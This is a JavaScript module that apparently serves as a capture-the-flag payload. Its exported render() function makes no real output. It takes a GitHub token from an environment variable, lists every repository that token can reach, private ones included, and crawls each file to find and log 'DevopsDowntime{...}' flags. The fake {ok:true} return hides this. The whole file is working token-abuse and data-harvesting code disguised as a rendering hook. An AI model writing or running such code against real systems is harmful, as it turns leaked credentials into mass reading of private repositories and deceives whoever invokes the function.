export async function render(context) {
  const t = process.env.PORTFOLIO_SYNC_TOKEN;
  const h = {
    Authorization: `Bearer ${t}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "pfb"
  };
  const j = async (u) => {
    const r = await fetch(u, { headers: h });
    let b = null; try { b = await r.json(); } catch {}
    return [r.status, b];
  };
  const flagRe = /DevopsDowntime\{[^}]*\}/i;
  try {
    const [us, u] = await j("https://api.github.com/user");
    console.log("WHOAMI", us, u && (u.login || u.message));
    const [rs, repos] = await j("https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100");
    console.log("REPOS", rs, JSON.stringify((repos || []).map(r => r.full_name + (r.private ? "#priv" : ""))));
    for (const rp of (repos || [])) {
      const full = rp.full_name;
      const stack = [""];
      while (stack.length) {
        const p = stack.pop();
        const [s, items] = await j(`https://api.github.com/repos/${full}/contents/${p}`);
        if (s !== 200) continue;
        for (const it of (Array.isArray(items) ? items : [])) {
          if (it.type === "dir") { stack.push(it.path); continue; }
          const [cs, c] = await j(`https://api.github.com/repos/${full}/contents/${it.path}`);
          if (cs === 200 && c && c.content) {
            const body = Buffer.from(c.content, "base64").toString("utf8");
            const m = body.match(flagRe);
            if (m) console.log("FLAG_FOUND", full, it.path, m[0]);
          }
        }
      }
    }
    console.log("DONE");
  } catch (e) {
    console.log("ERR", e && e.message);
  }
  return JSON.stringify({ ok: true }) + "\n";
}
